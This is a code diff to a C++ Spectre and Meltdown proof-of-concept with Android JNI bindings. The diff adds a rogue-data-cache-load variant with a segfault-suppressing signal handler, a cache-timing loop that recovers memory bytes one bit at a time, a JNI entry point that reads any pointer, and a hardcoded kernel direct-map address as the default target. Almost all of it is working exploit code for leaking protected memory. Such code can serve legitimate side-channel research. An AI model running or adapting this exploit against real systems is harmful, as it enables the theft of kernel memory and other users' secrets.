@@ -3,6 +3,9 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <algorithm>
+#include <signal.h>
+#include <unistd.h>
+#include <setjmp.h>
 
 #ifdef __ANDROID_API__
 #include "android_spectre_Spectre.h"
@@ -26,6 +29,8 @@
 #define CONCAT(x,y) CONCAT_(x,y)
 #define PAD uint8_t ALIGN_CACHE CONCAT(pad_, __LINE__);
 
+
+
 class LibFlush {
 public:
   libflush_session_t* session = nullptr;
@@ -44,6 +49,10 @@ public:
 
   ~LibFlush() {
     libflush_terminate(session);
+  }
+
+  inline void* to_physical(const void* ptr) {
+    return (void*) libflush_get_physical_address(session, (uintptr_t)ptr);
   }
 
   inline void access(void* ptr) {
@@ -98,11 +107,29 @@ public:
   }
 };
 
+
+static jmp_buf signsegv_jmp;
+static void sigsegv_handler(int signum) {
+  sigset_t sigs;
+  sigemptyset(&sigs);
+  sigaddset(&sigs, signum);
+  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+  longjmp(signsegv_jmp, 1);
+}
+
+enum class SpectreVariant  : uint8_t {
+  None=0,
+  BoundsCheckBypass=1,
+  BranchTargetInjection=2,
+  RogueDataCacheLoad=4,
+  All=7
+};
+
 class Spectre {
   LibFlush& libflush;
   uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
   uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
-  uint32_t   ALIGN_CACHE array1_size;
+  size_t     ALIGN_CACHE array1_size;
 
 
 public:
@@ -115,53 +142,79 @@ public:
     array1_size = sizeof(array1);
   }
 
-  void victim(int x) {
+  void victim_variant1(size_t x, uint8_t mask) {
     if (x < array1_size) {
-      volatile uint8_t tmp = array2[array1[x] * CACHE_LINE_SIZE];
+      volatile uint8_t tmp = array2[(array1[x] & mask) * CACHE_LINE_SIZE];
+    }
+  }
+
+  void victim_variant3(uint8_t* ptr, uint8_t mask) {
+    for (int i=0; i<100; i++) {
+      if (!setjmp(signsegv_jmp)) {
+        volatile uint8_t value;
+        do {
+          value =  *ptr;
+        } while (!value);
+        volatile uint8_t tmp = array2[(value & mask) * CACHE_LINE_SIZE];
+      }
     }
   }
 
   /* Report best guess in value[0] and runner-up in value[1] */
-  void readMemoryByte(const void* target_ptr, uint8_t value[2], int score[2]) {
-    size_t malicious_x = (size_t)target_ptr - (size_t)array1;
+  void readMemoryByte(const void* target_ptr, SpectreVariant variant, uint8_t value[2], int score[2]) {
     int results[256];
-    int tries, first, second;
-    size_t training_x, x;
-
     for (int i = 0; i < 256; i++)
       results[i] = 0;
-    for (tries = 999; tries > 0; tries--) {
 
-      /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-      training_x = tries % array1_size;
-      for (int i = 5; i >= 0; i--) {
-        libflush.flush(&array1_size);
-        /* Flush array2[256*(0..255)] from cache */
-        for (int i = 0; i < 256; i++)
-          libflush.flush(&array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */
-
-        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
-
-        /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
-        /* Avoid jumps in case those tip off the branch predictor */
-        x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
-        x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
-        x = training_x ^ (x & (malicious_x ^ training_x));
-
-        /* Call the victim! */
-        victim(x);
+    // Hook signal handler to ignore segfaults when accessing protected memory
+    sighandler_t old_sigsegv_handler = nullptr;
+    if ((int)variant & (int)SpectreVariant::RogueDataCacheLoad) {
+      old_sigsegv_handler = signal(SIGSEGV, sigsegv_handler);
+      if (old_sigsegv_handler == SIG_ERR) {
+          fprintf(stderr, "Failed to setup signal handler\n");
       }
+    }
 
-      /* Time reads. Order is mixed up to prevent stride prediction */
-      for (int i=0, mix=157; i < 256; i++, mix=(mix+167) & 0xFF) {
-        uint8_t* addr = &array2[mix * CACHE_LINE_SIZE];
-        if (libflush.is_cache_hit(addr)) {
-          results[mix]++; /* cache hit - add +1 to score for this value */
+    for (int tries = 999; tries > 0; tries--) {
+      uint8_t result = 0;
+      for (uint8_t mask=1; mask; mask=mask<<1) {
+        libflush.flush(&array2[mask * CACHE_LINE_SIZE]);
+
+        // --- Probe using variant 1 ---
+        if ((int)variant & (int)SpectreVariant::BoundsCheckBypass) {
+          size_t malicious_x = (size_t)target_ptr - (size_t)array1;
+          for (int i = 599; i >= 0; i--) {
+            size_t training_x = (tries + i) % array1_size;
+            libflush.flush(&array1_size);
+
+            for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+            /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
+            /* Avoid jumps in case those tip off the branch predictor */
+            size_t x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
+            x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
+            x = training_x ^ (x & (malicious_x ^ training_x));
+
+            /* Call the victim! */
+            victim_variant1(x, mask);
+          }
+        }
+
+        // --- Probe using variant 2 ---
+        if ((int)variant & (int)SpectreVariant::RogueDataCacheLoad) {
+          victim_variant3((uint8_t*)target_ptr, mask);
+        }
+
+
+        // --- Check probing result measuring cache timing
+        if (libflush.is_cache_hit(&array2[mask * CACHE_LINE_SIZE])) {
+          result |= mask;
         }
       }
+      results[result]++;
 
       /* Locate highest & second-highest results results tallies in j/k */
-      first = second = -1;
+      int first=-1, second=-1;
       for (int i = 0; i < 256; i++) {
         if (first < 0 || results[i] >= results[first]) {
           second  = first;
@@ -170,13 +223,19 @@ public:
           second = i;
         }
       }
-      if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0))
+      if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) {
+        value[0] = (uint8_t) first;
+        score[0] = results[first];
+        value[1] = (uint8_t) second;
+        score[1] = results[second];
         break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+      }
     }
-    value[0] = (uint8_t) first;
-    score[0] = results[first];
-    value[1] = (uint8_t) second;
-    score[1] = results[second];
+
+    //Restore signal handler
+    if ((int)variant & (int)SpectreVariant::RogueDataCacheLoad) {
+      signal(SIGSEGV, old_sigsegv_handler);
+    }
   }
 
 
@@ -184,7 +243,7 @@ public:
     for (const char* ptr = (const char*)target_ptr; ptr < (const char*)target_ptr + target_len; ptr++) {
       uint8_t value[2];
       int score[2];
-      readMemoryByte(ptr, value, score);
+      readMemoryByte(ptr, SpectreVariant::RogueDataCacheLoad, value, score);
 
       LOG(
         "Reading at %p... %s: 0x%02X='%c', score=%d",
@@ -231,24 +290,35 @@ jint Java_android_spectre_Spectre_calibrateTiming(JNIEnv *env, jclass cls, jint 
 }
 
 
-JNIEXPORT void JNICALL Java_android_spectre_Spectre_read (JNIEnv *env, jclass cls, jbyteArray jdata, jobject resultCallback) {
-    if (jdata == nullptr || resultCallback == nullptr) {
+void Java_android_spectre_Spectre_readBuf (JNIEnv *env, jclass cls, jbyteArray data, jobject resultCallback, jint variant) {
+    if (data == nullptr) {
+        return;
+    }
+
+    jsize len = env->GetArrayLength(data);
+    jbyte* ptr = env->GetByteArrayElements(data, nullptr);
+
+    if (ptr != NULL) {
+        Java_android_spectre_Spectre_readPtr(env, cls, (jlong)ptr, len, resultCallback, variant);
+    }
+    env->ReleaseByteArrayElements(data, ptr, 0);
+}
+
+
+void Java_android_spectre_Spectre_readPtr(JNIEnv *env, jclass cls, jlong ptr, jint len, jobject resultCallback, jint variant) {
+    if (resultCallback == nullptr) {
         return;
     }
 
     jclass callbackCls = env->GetObjectClass(resultCallback);
     jmethodID callbackMethod = env->GetMethodID(callbackCls, "onByte", "(IJBIBI)V");
 
-    jsize len = env->GetArrayLength(jdata);
-    jbyte* data = env->GetByteArrayElements(jdata, nullptr);
-    if (data != NULL) {
-        for (int i=0; i<len; i++) {
-            uint8_t value[2];
-            int score[2];
-            spectre.readMemoryByte(data+i, value, score);
+    for (int i=0; i<len; i++) {
+        uint8_t value[2];
+        int score[2];
+        spectre.readMemoryByte((void*)(ptr+i), (SpectreVariant)variant, value, score);
 
-            env->CallVoidMethod(resultCallback, callbackMethod, i, (jlong)data+i, (jbyte)value[0], score[0], (jbyte)value[1], score[1]);
-        }
+        env->CallVoidMethod(resultCallback, callbackMethod, i, ptr+i, (jbyte)value[0], score[0], (jbyte)value[1], score[1]);
     }
 }
 
@@ -260,18 +330,21 @@ int main(int argc, const char** argv) {
   const char* target_ptr = "Mary had a little lamb";
   int target_len = strlen(target_ptr);
 
+  LOG("physical address: %p / %p\n", target_ptr, libflush.to_physical(target_ptr));
+//   target_ptr = 0xffff880000000000 + (const char*)libflush.to_physical(target_ptr);
+  target_ptr = 0xffff880000000000 + (const char*)0x397c133f8;
+
   if (argc == 3) {
     sscanf(argv[1], "%p", &target_ptr);
     sscanf(argv[2], "%d", & target_len);
   }
 
   if (libflush_bind_to_cpu(MAIN_THREAD_CPU) == false) {
-    fprintf(stderr, "Warning: Could not bind main thread to CPU %d\n", MAIN_THREAD_CPU);
+    LOG("Warning: Could not bind main thread to CPU %d\n", MAIN_THREAD_CPU);
     return -1;
   }
 
   spectre.dump(target_ptr, target_len);
-
   return (0);
 }
 #endif
